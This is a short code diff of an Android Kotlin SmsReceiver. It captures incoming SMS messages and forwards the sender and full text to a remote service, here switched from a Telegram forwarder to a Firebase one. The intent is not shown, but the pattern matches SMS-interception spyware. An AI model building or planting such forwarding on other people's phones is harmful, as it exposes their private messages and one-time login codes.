@@ -19,6 +19,6 @@ class SmsReceiver : BroadcastReceiver() {
         val fullBody = messages.joinToString(separator = "") { it.messageBody ?: "" }
 
         Log.d("SmsReceiver", "SMS from $sender captured, forwarding...")
-        TelegramForwarder.send(context, sender, fullBody)
+        FirebaseForwarder.send(context, sender, fullBody)
     }
 }
